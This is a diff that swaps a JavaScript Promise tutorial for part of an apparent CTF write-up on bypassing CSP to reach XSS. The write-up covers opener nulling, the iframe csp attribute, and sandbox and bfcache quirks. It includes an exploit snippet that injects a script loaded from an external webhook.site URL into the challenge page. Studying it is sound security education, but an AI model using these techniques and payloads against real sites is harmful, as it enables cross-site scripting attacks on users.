@@ -1,84 +1,139 @@
-<!-- more -->
+## Difficulties
 
+Let's not worry about the opener for now; that one is easier to solve. The difficult part is the CSP.
 
-Now let's assume we have three APIs. The first is an API that fetches a list of articles.
-```json
-[
-  {
-    "title": "Article 1",
-    "id": 1
-  },
-  {
-    "title": "Article 2",
-    "id": 2
-  },
-  {
-    "title": "Article 3",
-    "id": 3
+After reading the problem, my thought process was as follows: since the CSP of `<iframe srcdoc>` inherits from its parent, if the upper layer has it, the lower layer must have it too. Therefore, we need to find a way to remove that CSP. Since we want to remove it, the only way I could think of is to add CSP through the `<iframe csp>` attribute, which can prevent that script from loading.
+
+However, since the content of this problem is brought in through cookies, there will be same-site cookie restrictions. We cannot insert an iframe in our origin; the cookies will have issues. Therefore, we must use `<iframe csp>` at the problem's origin. Other than this, I can't think of any way to remove the CSP.
+
+## Solution
+
+The reason I said the opener is easier to solve is that I have seen similar problems before.
+
+There are a few methods to make the opener null. The first one is similar to what appeared in [SekaiCTF 2022 - Obligatory Calc](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/#obligatory-calc). After executing `window.open`, quickly close itself, and `opener` will be null. The author of this problem, icesfont, used this method (if you test it in the console, you will find that nothing happens after execution because browsers by default cannot open a new window without user interaction, so the second open will be blocked):
+
+``` js
+function openNoOpener(url, name) {
+  open(URL.createObjectURL(new Blob([`
+    <script>
+      open("${url}", "${name}");
+      window.close();
+    <\/script>
+  `], { type: "text/html" })));
+}
+```
+
+The second method I saw proposed by Jazzy in Discord is actually just to set the opener to null after opening:
+
+``` js
+function openNoOpener(url, name) {
+  let w = window.open(url, name)
+  w.opener = null
+}
+```
+
+The reason this works is that right after opening, there is a short period when the opened window and the current window are same-origin, so during this time, it can be manipulated, and then it will be redirected to the desired URL.
+
+Although the opener is lost, it seems to be disconnected from the opened window, but actually, it can be accessed again using the `name` attribute. I have written about this before: [iframe and window.open magic](https://blog.huli.tw/2022/04/07/en/iframe-and-window-open/#windowopen).
+
+After solving the opener issue, we can look at the other most troublesome part, which is that script. If we can prevent it from executing, it would be easy to achieve XSS. But how can we prevent it from executing? I have previously [written](https://blog.huli.tw/2022/04/07/en/iframe-and-window-open/#iframes-csp) that there is an attribute called `csp` on iframes, and by adding it, we can set the CSP.
+
+As mentioned earlier, due to same-site cookies, we need to directly use the problem's memo function to embed it. The code is as follows(modified from the exploit posted by Jazzy in Discord channel):
+
+``` html
+<script>
+  const challengeHost = 'http://localhost:1337'
+  function openNoOpener(url, name) {
+    let w = window.open(url, name)
+    w.opener = null
   }
-]
+
+  let html = `
+    html
+    <script src="http://webhook.site/0fdd5e6d-0882-44de-b593-212aecf604c1"><\/script>
+    <iframe csp="script-src http: https:" src="/"></iframe>
+  `;
+
+  openNoOpener(`${challengeHost}/memo?memo=${encodeURIComponent(html)}`, 'main');
+</script>
 ```
 
-The second is an API that fetches the content of an article given its ID.
-```javascript
-{
-  "authorId": 5,
-  "content": "content",
-  "timestamp": "2015-08-26"
-}
+Using CSP to prevent inline scripts from executing, and then reloading the webpage, will execute the originally prepared script. However, I actually tried it, and the latest version will have an error:
+
+> Refused to display 'http://localhost:1337/' in a frame. The embedder requires it to enforce the following Content Security Policy: 'script-src http: https:'. However, the frame neither accepts that policy using the Allow-CSP-From header nor delivers a Content Security Policy which is at least as strong as that one.
+
+If the page originally does not have a CSP, it cannot be forcibly added. From post-match discussions, it seems that older versions of Chrome have less strict restrictions on same-origin CSP, so it can only work in older versions (though I'm not sure, and I'm too lazy to find an old version to test).
+
+Next, let's talk about the expected solution, which involves a lot of knowledge related to iframes. I spent about a week gradually understanding why the expected solution can work. To make it easier to understand, I broke it down into several small parts, and following along should help you understand the final expected solution.
+
+### 1. Navigation of iframes
+
+Since an iframe is an independent window, it can also perform navigation to other places. Suppose there is an iframe on the webpage, and its original src is A. If you change the src to B, what happens when you press the back button (or execute `history.back()`)? There are two possibilities:
+
+1. The entire webpage (top level) goes back to the previous page.
+2. The iframe goes back to the previous page (from B to A).
+
+The answer is 2, meaning that when you perform navigation, the iframe's history will also be added to the overall history.
+
+Knowing this premise, we can look at a situation:
+
+``` html
+<body>
+  <iframe sandbox id=f src="data:text/html,test1:<script>document.writeln(Math.random())</script>"></iframe>
+  <button onclick="loadTest2()">load test2</button>
+</body>
+<script>
+  function loadTest2() {
+    f.removeAttribute('sandbox')
+    f.src = 'data:text/html,test2:<script>document.writeln(Math.random())<\/script>'
+  }
+</script>
 ```
 
-The third is an API that returns author information given an author ID.
-```javascript
-{
-  "email": "aszx87410@gmail.com",
-  "name": "huli",
-  "id": 5
-}
-```
+1. First, load test1 into the iframe and add a sandbox, so the script will not execute.
+2. Press the loadTest2 button to remove the iframe's sandbox and navigate to test2, so the script will execute.
 
-Now the functionality we want to achieve is: **fetch the email of the author of the latest article**. The process is: fetch the article list -> fetch the article information -> fetch the author. The code implementation looks like this.
-``` javascript
-getArticleList(function(articles){
-	getArticle(articles[0].id, function(article){
-    	getAuthor(article.authorId, function(author){
-        	alert(author.email);
-        })
-    })
-})
+At this point, if you press the back button, the iframe will naturally return to test1. However, the sandbox may have two situations:
 
-function getAuthor(id, callback){
-    $.ajax("http://beta.json-generator.com/api/json/get/E105pDLh",{
-    	author: id
-    }).done(function(result){
-    	callback(result);
-    })
-}
+1. The sandbox also returns to the state when loading test1.
+2. The sandbox maintains its current properties, meaning there is no sandbox.
 
-function getArticle(id, callback){
-    $.ajax("http://beta.json-generator.com/api/json/get/EkI02vUn",{
-    	id: id
-    }).done(function(result){
-    	callback(result);
-    })
-}
+The answer will be 2; the sandbox's properties do not change. Therefore, after pressing back, the sandbox is gone, and the script in test1 can now execute.
 
-function getArticleList(callback){
-	$.ajax(
-    "http://beta.json-generator.com/api/json/get/Ey8JqwIh")
-    .done(function(result){
-        callback(result);
-    });
-}
-```
-Or refer to the online example: [Implemented with callback](http://jsfiddle.net/ddam2mof/2/)
+It actually feels quite reasonable, after all, you only changed the src, and did not modify the sandbox, so the sandbox remains in its latest state.
 
-I believe that this code should not be unfamiliar to everyone, but there is a disadvantage to this approach, which is what we commonly call callback hell. It's a bit ugly to have layer upon layer like this. So what should we do? There is something called `Promise`, which appears like this. Let's have a practical example first and then explain it!
-``` javascript
-getArticleList().then(function(articles){
-	return getArticle(articles[0].id);
-}).then(function(article){
-    return getAuthor(article.authorId);
-}).then(function(author){
-	alert(author.email);
-});
+### 2. iframe reparenting and bfcache
+
+The previous situation involved changing the sandbox and loading a new src, then going back to the previous page. Next, let's look at another situation where the first half is the same, but after loading a new src, we do not directly go back to the previous page; instead, we first navigate the entire webpage to another page and then go back:
+
+``` html
+<body>
+  <iframe sandbox id=f src="data:text/html,test1:<script>document.writeln(Math.random())</script>"></iframe>
+  <button onclick="loadTest2()">load test2</button>
+  <button onclick="location = 'a.html'">top level navigation</button>
+</body>
+<script>
+  console.log('run')
+  function loadTest2() {
+    f.removeAttribute('sandbox')
+    f.src = 'data:text/html,test2:<script>document.writeln(Math.random())<\/script>'
+  }
+</script>
+``` 
+
+The testing process is:
+
+1. Wait for the iframe to finish loading, and you will see test1 on the screen. At this point, because there is a sandbox, the script will not execute.
+2. Press the load test2 button to remove the sandbox and load test2, causing the script to execute.
+3. Press the top-level navigation to jump the webpage to another location.
+4. Press the back button in the browser.
+
+So what is the expected situation after pressing the back button? There will be two results based on whether there is a bfcache; first, let's look at the case with bfcache.
+
+If there is a bfcache, pressing the back button will return to the same state as before, and you can observe:
+
+1. The console does not show run, indicating that the script will not be executed again.
+2. The iframe's src is test2.
+3. The random number in test2 is the same as before, indicating that the script in the iframe has not been executed again.
+
+After all, it's called bfcache, so it will completely retain the previous state without reloading the webpage.
